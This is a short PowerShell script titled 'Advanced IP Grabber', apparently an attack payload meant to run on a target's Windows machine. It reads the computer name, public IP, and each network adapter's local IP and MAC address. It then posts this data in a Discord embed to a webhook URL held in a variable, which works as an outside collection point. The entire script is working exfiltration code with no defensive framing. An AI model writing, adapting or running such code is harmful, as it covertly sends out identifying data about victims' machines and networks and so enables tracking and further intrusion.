$hookurl = "$dc"
$title = "Advanced IP Grabber"
$targetPC = (Get-WmiObject -class Win32_ComputerSystem).Name
$description = "Target: **$targetPC**"
$color = '16744960'



# Get the IP configuration for all adapters
$ipConfig = Get-NetIPConfiguration

# Set the values for the embed fields
$fields = @()

# Add the public IP to the fields array
try{$publicIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$publicIP="Error getting Public IP"}

$fields += @{ name = "Public IP"; value = "*" + $publicIP + "*" }

# Iterate through the adapters
foreach ($adapter in $ipConfig.IPv4Address) {
    # Get the local IP address
    $localIP = $adapter.IPAddress

    # Get the adapter name
    $adapterName = $adapter.InterfaceAlias

    # Get the MAC address of the adapter
    $macAddress = (Get-NetAdapter -Name $adapterName).MacAddress
    
    # Add the adapter information to the fields array
    $adapterValue = "Local IP: *$localIP*`nMAC Address: *$macAddress*"
    $fields += @{ name = $adapterName; value = $adapterValue}
}

# Create the embed object
$embed = @{
    title       = $title
    description = $description
    color       = $color
    fields      = $fields
}

$payload = @{
    "embeds" = @($embed)
}

# Convert payload object to json
$payload = ConvertTo-Json -InputObject $payload -Compress -Depth 10

# Use the Discord API to send the embed to a channel
Invoke-RestMethod -Method "Post" -Uri $hookurl -Body $payload -ContentType 'application/json'